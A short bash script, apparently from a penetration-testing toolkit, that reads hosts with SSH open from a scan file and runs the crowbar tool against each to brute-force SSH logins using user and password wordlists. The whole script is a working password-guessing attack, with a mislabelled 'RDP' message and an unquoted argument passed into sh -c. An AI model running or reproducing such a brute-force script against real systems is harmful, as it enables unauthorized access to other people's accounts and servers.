#!/usr/bin/env bash

source meuk/globalmeuk.sh

scanfile=${1:-}

if [ -z "$scanfile" ]; then
  echo "naam?"
  exit;
fi

result=$(sh -c "./search.sh ${scanfile} ssh")

for xhost in $result; do
  echo "[+] RDP on ${xhost}"
  crowbar -b ssh -s ${xhost}/32 -U meuk/wordlists/users.txt -C meuk/wordlists/passwords.txt -l meuk/logs/crowbar_ssh_${DATUM}.log

done